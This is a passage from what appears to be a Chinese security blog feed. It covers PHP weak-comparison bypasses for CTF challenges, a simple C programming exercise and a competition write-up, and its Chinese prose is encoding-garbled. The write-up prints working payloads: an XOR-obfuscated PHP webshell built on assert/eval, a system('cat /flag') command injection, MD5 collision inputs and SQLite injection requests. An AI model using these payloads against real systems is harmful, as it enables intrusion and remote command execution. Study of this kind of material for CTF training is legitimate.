&lt;= $nine) ) &#123; return false; &#125; &#125; return $number == &#x27;54975581388&#x27;;&#125;if( fun($_GET[&#x27;a&#x27;]) ) echo &#x27;flag&#x27;;else echo &#x27;Wrong&#x27;;?&gt; ord() å‡½æ•°è¿”å›žå­—ç¬¦ä¸²çš„é¦–ä¸ªå­—ç¬¦çš„ ASCII å€¼ã€‚ è¿™é“é¢˜çš„æ„æ€å°±æ˜¯è¦æ±‚è¾“å…¥ä¸€ä¸ªkeyï¼Œç„¶åŽè¿™ä¸ªkeyå¿…é¡»ç­‰äºŽ54975581388ï¼Œä½†æ˜¯åœ¨è‡ªå®šä¹‰çš„å‡½æ•°é‡Œé¢åˆä¸å…è®¸å‡ºçŽ°æ•°å­—1åˆ°9ï¼Œæ­£å¥½54975581388=0xcccccccccè¿™æ ·å°±ç»•è¿‡äº†æ£€æµ‹ã€‚ â€œ0xâ€å¼€å¤´è·Ÿæ•°å­—çš„å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚â€0x1e240â€ï¼‰ä¼šè¢«å½“ä½œ16è¿›åˆ¶æ•°åŽ»æ¯”è¾ƒã€‚ 1234&lt;?phpvar_dump(0x1e240 == 123456);var_dump(54975581388 == 0xccccccccc);?&gt; bool(true)bool(true) 1?a&#x3D;0xccccccccc hashå€¼å’Œå­—ç¬¦ä¸²â€œ0â€æ¯”è¾ƒåœ¨æ¯”è¾ƒçš„æ—¶å€™ï¼Œå½“å‡ºçŽ°xexæ¨¡å¼ï¼Œå°†ä¼šå½“åšç§‘å­¦è®¡æ•°æ³•è¿›è¡Œæ¯”è¾ƒã€‚ è€Œåªè¦æ˜¯ä»¥0eå¼€å¤´ï¼ŒåŽé¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²å’Œå­—ç¬¦ä¸²0æ¯”è¾ƒå€¼éƒ½æ˜¯ç›¸ç­‰çš„ï¼Œå³0e\\d+çš„å­—ç¬¦ä¸² == â€˜0â€™ ä¸ºtrueã€‚ 12345678910111213&lt;?php$str1 = &quot;a&quot;;echo md5($str1);var_dump(md5($str1) == &#x27;0&#x27;);$str2 = &quot;s224534898e&quot;;echo md5($str2);var_dump(md5($str2) == &#x27;0&#x27;);$str3 = &#x27;a1b2edaced&#x27;;echo md5($str3);var_dump(md5($str3) == &#x27;0&#x27;);?&gt; 0cc175b9c0f1b6a831c399e269772661bool(false)0e420233178946742799316739797882bool(true)0e45ea817f33691a3dd1f46af81166c4bool(false) PHP ç»„åˆæ¯”è¾ƒè¿ç®—ç¬¦ç»„åˆæ¯”è¾ƒè¿ç®—ç¬¦ï¼Œç¬¦å·ä¸ºï¼š&lt;=&gt; 1$c = $a &lt;=&gt; $b; ç›¸å½“äºŽ 1$c = $a &gt; $b ? 1 : ( $a==$b ? 0 : -1 ); å½“ $a &gt; $b æ—¶ï¼Œ$c = 1 å½“ $a == $b æ—¶ï¼Œ$c = 0 å½“ $a &lt; $b æ—¶ï¼Œ$c = -1 123456&lt;?php$a = 1;$b = 2;$c = $a &lt;=&gt; $b;echo $c;?&gt; -1 ç»„åˆæ¯”è¾ƒè¿ç®—ç¬¦åŒæ ·å­˜åœ¨ == å¼±ç±»åž‹æ¯”è¾ƒé—®é¢˜ï¼ŒåŽŸç†åŒ â€œ==â€ä¸Žâ€œ===â€ 123456&lt;?php$a = &#x27;0e12&#x27;;$b = &#x27;0e34&#x27;;$c = $a &lt;=&gt; $b;echo $c;?&gt; 0 PHP strcmp() å‡½æ•°1int strcmp ( string $str1 , string $str2 ) æ ¹æ®ACSIIè¡¨è¿›è¡Œæ¯”è¾ƒï¼Œä»Žå·¦åˆ°å³ä¾æ¬¡è¿›è¡Œï¼Œå‡ºçŽ°ä¸åŒå°±åœæ­¢æ¯”è¾ƒï¼Œè¿”å›žç»“æžœã€‚ å¦‚æžœ str1 å°äºŽ str2 è¿”å›ž &lt; 0ï¼› å¦‚æžœ str1 å¤§äºŽ str2 è¿”å›ž &gt; 0ï¼›å¦‚æžœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å›ž 0ã€‚ 1234&lt;?php// äºŒè¿›åˆ¶å®‰å…¨æ¯”è¾ƒå­—ç¬¦ä¸²ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰echo strcmp(&#x27;Hello&#x27;, &#x27;hello&#x27;);?&gt; -1 å› ä¸ºâ€™Hâ€™çš„ASCIIå€¼æ¯”â€™hâ€™çš„å°ï¼Œæ‰€ä»¥è¿”å›žè´Ÿæ•° 12345678910&lt;?php$password=&quot;***&quot;;if(isset($_GET[&#x27;password&#x27;]))&#123; if (strcmp($_GET[&#x27;password&#x27;], $password) == 0) echo &quot;flag&quot;; else echo &quot;Wrong&quot;;&#125;?&gt; PHP5.3ä»¥ä¸Šç‰ˆæœ¬çš„strcmp()å­˜åœ¨æ¼æ´žï¼Œåªè¦$_GET[â€˜passwordâ€™]æ˜¯ä¸€ä¸ªæ•°ç»„æˆ–è€…ä¸€ä¸ªobjectå³å¯ç»•è¿‡ã€‚ 1?password[]&#x3D;a é¢˜ç›®weak_type112345678910&lt;?phphighlight_file(__FILE__);$o = $_GET[&#x27;o&#x27;];if(is_numeric($o))&#123; die(&quot;no hack!!&quot;);&#125;if($o==520)&#123; echo file_get_contents(&#x27;/flag&#x27;);&#125;?&gt; 1&#x2F;?o&#x3D;520a weak_type312345678910111213141516171819202122&lt;?phphighlight_file(__FILE__);function noother_says_correct($number)&#123; $one = ord(&#x27;1&#x27;); $nine = ord(&#x27;9&#x27;); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == &#x27;54975581388&#x27;;&#125;$flag=file_get_contents(&quot;/flag&quot;);if(noother_says_correct($_GET[&#x27;key&#x27;])) echo $flag;else echo &#x27;access denied&#x27;;?&gt; 1&#x2F;?key&#x3D;0xccccccccc weak_type412345678910&lt;?phphighlight_file(__FILE__);if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123; if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;]) if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) echo file_get_contents(&quot;/flag&quot;); else print &#x27;Wrong.&#x27;;&#125;?&gt; 1a[]&#x3D;1&amp;b[]&#x3D;2 weak_type512345678910111213141516171819&lt;?phpif (isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]))&#123; $logined = true; $username = $_GET[&#x27;username&#x27;]; $password = $_GET[&#x27;password&#x27;]; if (!ctype_alpha($username)) &#123;$logined = false;&#125; if (!is_numeric($password) ) &#123;$logined = false;&#125; if (md5($username) != md5($password)) &#123;$logined = false;&#125; if ($logined)&#123; echo &quot;flag&quot;; &#125; else&#123; echo &quot;login failed!&quot;; &#125;&#125;?&gt; isset() æ£€æµ‹å˜é‡æ˜¯å¦è®¾ç½® ctype_alphaå‡½æ•°åŠŸèƒ½å°±æ˜¯æ£€æµ‹æ˜¯å¦æ˜¯å­—ç¬¦ is_numeric æ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸² usernameå¿…é¡»æ˜¯å­—æ¯ï¼Œpasswordå¿…é¡»æ˜¯æ•°å­—ï¼Œå†å°†ä¼ å…¥çš„usernameå’Œpasswordè¿›è¡Œmd5åŠ å¯†åŽè¿›è¡Œæ¯”è¾ƒä¸”ç»“æžœè¦ç›¸ç­‰ã€‚ å¦‚æžœmd5åŠ å¯†åŽçš„å€¼æ˜¯0eå¼€å¤´ï¼Œè¿™æ ·å°±å­˜åœ¨å¼±ç±»åž‹æ¯”è¾ƒé—®é¢˜å°±å¯ä»¥é€šè¿‡ï¼Œæ‰€ä»¥è¦æƒ³å¾—åˆ°flagï¼Œå¾—å¯»æ‰¾çº¯å­—æ¯å’Œçº¯æ•°å­—md5åŠ å¯†åŽæ˜¯0eå¼€å¤´çš„å€¼ã€‚ 123&lt;?phpvar_dump(md5(&#x27;QNKCDZO&#x27;) == md5(&#x27;240610708&#x27;));?&gt; bool(true) 1?username&#x3D;QNKCDZO&amp;password&#x3D;240610708 weak_type6123456789&lt;?phphighlight_file(__FILE__);$cmd=$_GET[&#x27;cmd&#x27;];if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123; echo `$cmd`;&#125; else &#123; echo (&quot;md5 is funny ~&quot;);&#125;?&gt; å°è¯•ä½¿ç”¨weak_type4çš„a[]=1&amp;b[]=2ï¼Œå‘çŽ°ä¸è¡Œï¼Œæµ‹è¯•åŽå‘çŽ°æ•°ç»„è¢«å¼ºåˆ¶è£…æ¢ä¸ºå­—ç¬¦ä¸²åŽéƒ½æ˜¯Array 123456&lt;?php$a = $_POST[&#x27;a&#x27;];$b = $_POST[&#x27;b&#x27;];echo &quot;a=&quot;.(string)$a.&quot;&lt;br&gt;&quot;;echo &quot;b=&quot;.(string)$b;?&gt; a=Array b=Array å‚è€ƒMD5ç¢°æ’žåŽï¼Œç”¨burp suiteæŠ“åŒ… a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 å¤©èžä¿¡é¢è¯•é¢˜12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;html&gt;&lt;body&gt; &lt;form action&#x3D;&quot;index.php&quot; class&#x3D;&quot;authform&quot; method&#x3D;&quot;post&quot; accept-charset&#x3D;&quot;utf-8&quot;&gt; &lt;fieldset&gt; &lt;legend&gt;Unbreakable Random&lt;&#x2F;legend&gt; &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;s&quot; name&#x3D;&quot;s&quot; value&#x3D;&quot;&quot; placeholder&#x3D;&quot;seed&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;h&quot; name&#x3D;&quot;h&quot; value&#x3D;&quot;&quot; placeholder&#x3D;&quot;hash&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Check&quot; &#x2F;&gt; &lt;div class&#x3D;&quot;return-value&quot; style&#x3D;&quot;padding: 10px 0&quot;&gt;&amp;nbsp;&lt;&#x2F;div&gt; &lt;&#x2F;fieldset&gt; &lt;&#x2F;form&gt;&lt;?phpfunction gen_secured_random() &#123; &#x2F;&#x2F; cause random is the way $a &#x3D; rand(1337,2600)*42; $b &#x3D; rand(1879,1955)*42; $a &lt; $b ? $a ^&#x3D; $b ^&#x3D; $a ^&#x3D; $b : $a &#x3D; $b; return $a+$b;&#125;function secured_hash_function($plain) &#123; &#x2F;&#x2F; cause md5 is the best hash ever $secured_plain &#x3D; sanitize_user_input($plain); return md5($secured_plain);&#125;function sanitize_user_input($input) &#123; &#x2F;&#x2F; cause someone told me to never trust user input $re &#x3D; &#39;&#x2F;[^a-zA-Z0-9]&#x2F;&#39;; $secured_input &#x3D; preg_replace($re, &quot;&quot;, $input); return $secured_input;&#125;if (isset($_GET[&#39;source&#39;])) &#123; show_source(__FILE__); die();&#125;require_once &quot;secret.php&quot;;if (isset($_POST[&#39;s&#39;]) &amp;&amp; isset($_POST[&#39;h&#39;])) &#123; $s &#x3D; sanitize_user_input($_POST[&#39;s&#39;]); $h &#x3D; secured_hash_function($_POST[&#39;h&#39;]); $r &#x3D; gen_secured_random(); if($s !&#x3D; false &amp;&amp; $h !&#x3D; false) &#123; if($s.$r &#x3D;&#x3D; $h) &#123; print &quot;Well done! Here is your flag: &quot;.$flag; &#125; else &#123; print &quot;Fail...&quot;; &#125; &#125; else &#123; print &quot;&lt;p&gt;Hum ...&lt;&#x2F;p&gt;&quot;; &#125;&#125;?&gt;&lt;p&gt;&lt;em&gt;&lt;a href&#x3D;&quot;index.php?source&quot;&gt;source code&lt;&#x2F;a&gt;&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; å…¶ä¸­å‡ ä¸ªå‡½æ•°çš„ä½œç”¨ gen_secured_random() è™½ç„¶ä¸çŸ¥é“$a ^= $b ^= $a ^= $bçš„ç»“æžœä¼šæ˜¯æ€Žä¹ˆæ ·çš„ï¼Œä½†$a+$bçš„å€¼çš„é•¿åº¦éƒ½æ˜¯å…­ä½æ•° 12345678910111213&lt;?phpfor($i = 1; $i &lt; 100; $i++)&#123; $a = rand(1337,2600)*42; $b = rand(1879,1955)*42; $a &lt; $b ? $a ^= $b ^= $a ^= $b : $a = $b; if(strlen($a+$b) != 6)&#123; echo &quot;ä¸æ˜¯6ä½æ•°&quot;; break; &#125;&#125;echo &quot;i = &quot;.$i;?&gt; i = 100 sanitize_user_input($input) å¯¹ä¼ è¿›æ¥çš„$inputè¿›è¡Œè¿‡æ»¤ï¼Œå°†ä¸æ˜¯26ä¸ªå­—æ¯å’Œæ•°å­—çš„å­—ç¬¦æ›¿æ¢ä¸ºç©º secured_hash_function($plain) è°ƒç”¨sanitize_user_input()å‡½æ•°ï¼Œå¯¹ä¼ è¿›æ¥çš„$plainè¿›è¡Œè¿‡æ»¤ï¼Œè¿”å›žè¿‡æ»¤åŽçš„md5å€¼ 12345678$s = sanitize_user_input($_POST[&#x27;s&#x27;]);$h = secured_hash_function($_POST[&#x27;h&#x27;]);$r = gen_secured_random();if($s != false &amp;&amp; $h != false) &#123; if($s.$r == $h) &#123; print &quot;Well done! Here is your flag: &quot;.$flag; &#125;&#125; å¯¹ä¼ è¿›æ¥çš„$sï¼Œè¿‡æ»¤æŽ‰å…¶å®ƒå­—ç¬¦ï¼Œå‰©ä¸‹å­—æ¯å’Œæ•°å­— $hä¹Ÿè¿‡æ»¤æŽ‰åŽè¿›è¡Œmd5åŠ å¯† $rä¸ºä¸€ä¸ª6ä½æ•°çš„æ•° å¦‚æžœ$så’Œ$héƒ½ä¸ç­‰äºŽfalse ä»¥åŠ $sæ‹¼æŽ¥ä¸Š$råŽå¦‚æžœå’Œ$hç›¸ç­‰çš„è¯ï¼Œå°±å¯ä»¥å¾—åˆ°flag è¿™é‡Œçš„==å­˜åœ¨å¼±ç±»åž‹æ¯”è¾ƒé—®é¢˜ PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æžœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åŽï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚ 1234&lt;?phpvar_dump(&quot;0e123456789&quot; == &quot;0&quot;); //bool(true)var_dump(&quot;0e123456789&quot; === &quot;0&quot;); //bool(false)?&gt; å·²çŸ¥ç”¨md5åŠ å¯†s878926199aåŽçš„ç»“æžœæ˜¯ä»¥0eå¼€å¤´çš„ 1234&lt;?php echo md5(&quot;s878926199a&quot;); //0e545993274517709034328855841020?&gt; æ‰€ä»¥$h=s878926199aï¼Œmd5åŠ å¯†åŽä¸º32ä½ï¼Œå‡åŽ»$rçš„6ä½åŽï¼Œä¹Ÿå°±æ˜¯è¯´$sæ˜¯ä»¥0eå¼€å¤´çš„26ä½æ•° å¯ä»¥æ˜¯$s=0e111111111111111111111111 å³s=0e111111111111111111111111&amp;h=s878926199a å½“ç„¶å¯ä»¥æ˜¯è¿™æ ·çš„ s=0e&amp;h=s878926199a","categories":[{"name":"ä¿¡æ¯å®‰å…¨","slug":"ä¿¡æ¯å®‰å…¨","permalink":"https://flag2020.top/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web","slug":"web","permalink":"https://flag2020.top/tags/web/"}]},{"title":"ä¸€é“ACMæµ‹è¯•èµ›çš„é¢˜ç›®","slug":"ä¸€é“ACMæµ‹è¯•èµ›çš„é¢˜ç›®","date":"2020-10-29T11:00:00.000Z","updated":"2020-11-11T15:11:40.522Z","comments":true,"path":"2020/10/29/ä¸€é“ACMæµ‹è¯•èµ›çš„é¢˜ç›®/","link":"","permalink":"https://flag2020.top/2020/10/29/%E4%B8%80%E9%81%93ACM%E6%B5%8B%E8%AF%95%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AE/","excerpt":"é¢˜ç›®ï¼šæŸ¥æ‰¾ç¼ºå¤±çš„å…ƒç´  å¤ªä¹…æ²¡åšç±»ä¼¼è¿™ç§é¢˜äº†ï¼Œä¸€é“å¾ˆç®€å•çš„é¢˜ç›®ï¼Œç«Ÿç„¶ç”¨äº†20å¤šåˆ†é’Ÿæ‰åšå‡ºæ¥ðŸ˜¥ æŸ¥æ‰¾ç¼ºå¤±çš„å…ƒç´ æè¿°ï¼šç»™å®šä¸€ä¸ªæ•°ç»„ï¼Œæ‰¾å‡ºå…¶ä¸­çš„æœ€å¤§å€¼nï¼Œè¾“å‡º[0,n]åœ¨è¯¥æ•°ç»„ä¸­ç¼ºå¤±çš„å…ƒç´ ã€‚ è¾“å…¥ï¼šè¾“å…¥ä»»æ„ä¸ªè‡ªç„¶æ•°ï¼Œå½“è¾“å…¥ä¸º-1æ—¶ï¼Œç»“æŸè¾“å…¥ã€‚ è¾“å‡ºï¼šè¾“å‡ºç¼ºå¤±çš„å…ƒç´ ï¼Œæ¯ä¸¤ä¸ªå…ƒç´ ä¹‹é—´ç”¨ç©ºæ ¼åˆ†éš”ã€‚","text":"é¢˜ç›®ï¼šæŸ¥æ‰¾ç¼ºå¤±çš„å…ƒç´  å¤ªä¹…æ²¡åšç±»ä¼¼è¿™ç§é¢˜äº†ï¼Œä¸€é“å¾ˆç®€å•çš„é¢˜ç›®ï¼Œç«Ÿç„¶ç”¨äº†20å¤šåˆ†é’Ÿæ‰åšå‡ºæ¥ðŸ˜¥ æŸ¥æ‰¾ç¼ºå¤±çš„å…ƒç´ æè¿°ï¼šç»™å®šä¸€ä¸ªæ•°ç»„ï¼Œæ‰¾å‡ºå…¶ä¸­çš„æœ€å¤§å€¼nï¼Œè¾“å‡º[0,n]åœ¨è¯¥æ•°ç»„ä¸­ç¼ºå¤±çš„å…ƒç´ ã€‚ è¾“å…¥ï¼šè¾“å…¥ä»»æ„ä¸ªè‡ªç„¶æ•°ï¼Œå½“è¾“å…¥ä¸º-1æ—¶ï¼Œç»“æŸè¾“å…¥ã€‚ è¾“å‡ºï¼šè¾“å‡ºç¼ºå¤±çš„å…ƒç´ ï¼Œæ¯ä¸¤ä¸ªå…ƒç´ ä¹‹é—´ç”¨ç©ºæ ¼åˆ†éš”ã€‚ ä¾‹1ï¼š è¾“å…¥ï¼š0 1 4 -1 è¾“å‡ºï¼š2 3 ä¾‹2ï¼š è¾“å…¥ï¼š5 8 -1 è¾“å‡ºï¼š0 1 2 3 4 6 7 åˆ†æžâ‘  è¾“å…¥æ•°å­—ï¼Œç›´åˆ°è¾“å…¥-1åˆ™åœæ­¢è¾“å…¥ â‘¡ æ‰¾åˆ°æ•°ç»„ä¸­çš„æœ€å¤§å€¼ â‘¢ è¾“å‡º[0,n]åœ¨è¯¥æ•°ç»„ä¸­ç¼ºå¤±çš„å…ƒç´  â‘  è¾“å…¥æ•°å­—ï¼Œç›´åˆ°è¾“å…¥-1åˆ™åœæ­¢è¾“å…¥1234567891011121314#include&lt;stdio.h&gt;int main()&#123; int a[100]; int i = 0; int x; scanf(&quot;%d&quot;, &amp;x); while(x != -1)&#123; a[i++] = x; scanf(&quot;%d&quot;, &amp;x); &#125; return 0;&#125; â‘¡ æ‰¾åˆ°æ•°ç»„ä¸­çš„æœ€å¤§å€¼12345678910111213141516171819202122#include&lt;stdio.h&gt;int main()&#123; int a[100]; int i = 0; int x; scanf(&quot;%d&quot;, &amp;x); while(x != -1)&#123; a[i++] = x; scanf(&quot;%d&quot;, &amp;x); &#125; int max = a[0]; int j; for(j=1; j&lt;i; j++)&#123; if(a[j] &gt; max)&#123; max = a[j]; &#125; &#125; return 0;&#125; â‘¢ è¾“å‡º[0,n]åœ¨è¯¥æ•°ç»„ä¸­ç¼ºå¤±çš„å…ƒç´ 1234567891011121314151617181920212223242526272829303132333435363738394041#include&lt;stdio.h&gt;int main()&#123; int a[100]; int i = 0; int x; scanf(&quot;%d&quot;, &amp;x); while(x != -1)&#123; a[i++] = x; scanf(&quot;%d&quot;, &amp;x); &#125; int max = a[0]; int j; for(j=1; j&lt;i; j++)&#123; if(a[j] &gt; max)&#123; max = a[j]; &#125; &#125; int tag = 0; int k = 0; for(k=0; k&lt;max; k++)&#123; for(j=0; j&lt;i; j++)&#123; if(k == a[j])&#123; tag = 1; break; &#125; &#125; if(tag == 0)&#123; printf(&quot;%d&quot;, k); if(k != max-1)&#123; printf(&quot; &quot;); &#125; &#125;else&#123; tag = 0; &#125; &#125; return 0; &#125;","categories":[{"name":"å…¶å®ƒ","slug":"å…¶å®ƒ","permalink":"https://flag2020.top/categories/%E5%85%B6%E5%AE%83/"}],"tags":[{"name":"å…¶å®ƒ","slug":"å…¶å®ƒ","permalink":"https://flag2020.top/tags/%E5%85%B6%E5%AE%83/"}]},{"title":"èœé¸¡åˆ’æ°´é˜Ÿ writeup","slug":"èœé¸¡åˆ’æ°´é˜Ÿwriteup","date":"2020-10-23T16:00:00.000Z","updated":"2020-11-11T15:38:08.638Z","comments":true,"path":"2020/10/24/èœé¸¡åˆ’æ°´é˜Ÿwriteup/","link":"","permalink":"https://flag2020.top/2020/10/24/%E8%8F%9C%E9%B8%A1%E5%88%92%E6%B0%B4%E9%98%9Fwriteup/","excerpt":"æ¯”èµ›ï¼š2020å…¨å›½å·¥ä¸šäº’è”ç½‘å®‰å…¨æŠ€æœ¯æŠ€èƒ½å¤§èµ› å­¦ç”Ÿç»„ æ­£å¦‚é˜Ÿåä¸€æ ·ï¼Œæˆ‘ä»¬åªæ˜¯æ¥åˆ’æ°´çš„ç­¾åˆ°é€‰æ‰‹","text":"æ¯”èµ›ï¼š2020å…¨å›½å·¥ä¸šäº’è”ç½‘å®‰å…¨æŠ€æœ¯æŠ€èƒ½å¤§èµ› å­¦ç”Ÿç»„ æ­£å¦‚é˜Ÿåä¸€æ ·ï¼Œæˆ‘ä»¬åªæ˜¯æ¥åˆ’æ°´çš„ç­¾åˆ°é€‰æ‰‹ ç­¾åˆ°æ‹¼å›¾ï¼Œæ‹¼å®Œå°±å¯ä»¥å¾—åˆ°flag flag 1flag&#123;welcome_to_chinaiisc2020&#125; SimpleCalculatorä¸çŸ¥é“æ€Žä¹ˆç”¨è¿™ä¸ªè®¡ç®—å™¨æ¥è®¡ç®—ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç ï¼Œå°è¯•ç”¨ ?search ä¼ å‚ å°è¯•ä½¿ç”¨å¼‚æˆ–ç»•è¿‡ 12345&lt;?php$a = urldecode(&#x27;%ff%ff%ff%ff&#x27;);$b = urldecode(&#x27;%a0%b8%ba%ab&#x27;);echo $a^$b;//è¾“å‡º_GET æž„é€ phpinfo() 123$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo æž„é€ webshell 123$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%ff]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%a0]);&amp;%ff=assert&amp;%a0=eval($_POST[%27cmd%27])//$&#123;_GET&#125;[assert]($&#123;_GET&#125;[eval($_POST[%27cmd%27])]); ä½¿ç”¨èšå‰‘æŸ¥çœ‹ http://eci-2ze7n0wiyptutv9upaxm.cloudeci1.ichunqiu.com/flag.php?search=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%ff]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%a0]);&amp;%ff=assert&amp;%a0=eval($_POST[%27cmd%27]) åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag flag 1flag&#123;08768680-a69a-42f1-b515-4220cf7e9a0d&#125; å…¶å®ƒæ–¹æ³•ï¼š 123?search=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;($&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%a0&#125;);&amp;%ff=system&amp;%a0=cat%20/flag//?search=$&#123;_GET&#125;&#123;system&#125;($&#123;_GET&#125;&#123;cat /flag&#125;); SQLManagerå‚è€ƒæ–‡ç« ï¼šhttps://www.anquanke.com/post/id/200927#h3-6 é¢˜ç›®è¯´è¿™æ˜¯ä¸ªç®€æ˜“çš„SQLiteç®¡ç†å™¨ã€‚ è€ŒSQLiteç®¡ç†å™¨æœ‰ä¸€ä¸ªè‡ªåŠ¨åˆ›å»ºçš„åº“sqlite_masterï¼Œé‡Œé¢ä¿å­˜äº†æ‰€æœ‰è¡¨åä»¥åŠåˆ›å»ºè¡¨æ—¶çš„createè¯­å¥ã€‚åœ¨åˆ›å»ºè¡¨æ—¶å¯ä»¥ç”¨asæ¥å¤åˆ¶å¦ä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»Žä¸­èŽ·å–åˆ°flagçš„è¡¨åå’Œå­—æ®µåã€‚ åœ¨å»ºè¡¨ç•Œé¢ç”¨burp suiteæŠ“åŒ…ï¼Œé‡æ”¾åŒ…å¾—åˆ°flagçš„è¡¨åå’Œå­—æ®µå table_name=a as select sql as[&amp;columns[0][name]=]from sqlite_master;&amp;columns[0][type]=INTEGER è¿™é‡Œå¯ä»¥å¾—çŸ¥flagæ‰€åœ¨çš„è¡¨ï¼šflag_Y0U_c4nt_GUESSï¼Œä»¥åŠæ‰€åœ¨çš„å­—æ®µï¼šflag_ThE_C0lumn åˆ è¡¨åŽå†æ¬¡æŠ“åŒ…ï¼Œè¡¨åä¸º b ï¼Œç»§ç»­ç”¨burp suiteé‡æ”¾åŒ… å°†aæ”¹ä¸ºbï¼Œsqlæ”¹ä¸ºflag_Y0U_c4nt_GUESSï¼Œå°†sqlite_masteræ”¹ä¸ºflag_ThE_C0lumn table_name=b as select [flag_ThE_C0lumn] as[&amp;columns[0][name]=]from flag_Y0U_c4nt_GUESS;&amp;columns[0][type]=INTEGER flag 1flag&#123;486756b1-d23c-4236-b44c-cd43640098c6&#125;","categories":[{"name":"æ¯”èµ›writeup","slug":"æ¯”èµ›writeup","permalink":"https://flag2020.top/categories/%E6%AF%94%E8%B5%9Bwriteup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://flag2020.top/tags/writeup/"}]},{"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ž","slug":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ž","date":"2020-10-16T16:00:00.000Z","updated":"2020-11-11T15:20:55.263Z","comments":true,"path":"2020/10/17/æ–‡ä»¶ä¸Šä¼ æ¼æ´ž/","link":"","permalink":"https://flag2020.top/2020/10/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"ä¸€äº›webåº”ç”¨ç¨‹åºä¸­å…è®¸ä¸Šä¼ å›¾ç‰‡ï¼Œæ–‡æœ¬æˆ–è€…å…¶ä»–èµ„æºåˆ°æŒ‡å®šçš„ä½ç½®ï¼Œæ–‡ä»¶ä¸Šä¼ æ¼æ´žå°±æ˜¯åˆ©ç”¨è¿™äº›å¯ä»¥ä¸Šä¼ çš„åœ°æ–¹å°†æ¶æ„ä»£ç æ¤å…¥åˆ°æœåŠ¡å™¨ä¸­ï¼Œå†é€šè¿‡urlåŽ»è®¿é—®ä»¥æ‰§è¡Œä»£ç ã€‚ é€šå¸¸é€ æˆæ–‡ä»¶ä¸Šä¼ æ¼æ´žçš„åŽŸå› æ˜¯ï¼šå¯¹äºŽä¸Šä¼ æ–‡ä»¶çš„åŽç¼€åï¼ˆæ‰©å±•åï¼‰ï¼Œç±»åž‹ï¼Œä»¥åŠå†…å®¹æ²¡æœ‰åšå¥½ä¸¥æ ¼çš„é™åˆ¶ç­‰ç­‰ä¸€äº›åŽŸå› ã€‚ æ–‡ä»¶ä¸Šä¼ æ¼æ´žæ˜¯æŒ‡ç”±äºŽç¨‹åºå‘˜æœªå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤ï¼Œè€Œå¯¼è‡´çš„ç”¨æˆ·å¯ä»¥è¶Šè¿‡å…¶æœ¬èº«æƒé™å‘æœåŠ¡å™¨ä¸Šä¸Šä¼ 